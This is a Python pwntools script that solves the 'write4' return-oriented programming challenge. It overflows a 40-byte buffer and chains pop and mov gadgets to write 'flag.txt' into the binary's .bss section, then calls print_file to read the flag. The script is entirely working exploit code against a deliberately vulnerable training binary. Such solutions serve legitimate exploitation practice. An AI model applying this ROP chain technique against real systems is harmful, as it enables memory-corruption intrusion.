#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./write4"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "b *pwnme+152")

ret = 0x00000000004004e6
pop_rdi = 0x0000000000400693
pop_r14_r15 = 0x0000000000400690
mov_gadget = 0x0000000000400628 # : mov qword ptr [r14], r15 ; ret

offset = 40
info("writing flag.txt @ %#x", elf.bss(0))
payload = flat(
	cyclic(offset, n=8),

	# pop elf.bss to r14 and writing flag.txt to r15
	pop_r14_r15,
	elf.bss(0),
	"flag.txt",
	mov_gadget,

	# invoking the print_file function:
	pop_rdi,
	elf.bss(0),
	elf.sym.print_file
)
io.sendlineafter(b"> ", payload)

io.interactive()
